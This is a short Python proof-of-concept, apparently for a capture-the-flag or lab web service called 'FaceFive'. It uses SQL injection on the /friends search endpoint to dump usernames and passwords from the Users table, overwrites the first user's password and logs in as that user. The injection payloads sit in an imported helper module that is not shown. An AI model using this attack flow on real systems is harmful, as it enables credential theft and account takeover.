# vuln1.py

# PoC for SQL injection on th /friends endpoint to change fields in the `Users` table
#
# the search bar allows for SQL injections which allow to read the entire DB

from tools import *
import sys
import os

debug = 'DEBUG' in os.environ and os.environ['DEBUG'] == '1'

url = sys.argv[1]

session = FaceFiveSession(url)

user = 'test'
passwd = 'testpasswd'

reset_image(session)
register(session, user, passwd)

users = select_query(session, 'Users', 'username', 'password')

user_1, password = users[0]

new_password = 'maga2020!'
update_user(session, passwd, user_1, password = new_password)

logout(session)
assert login(session, user_1, new_password).status_code == 200
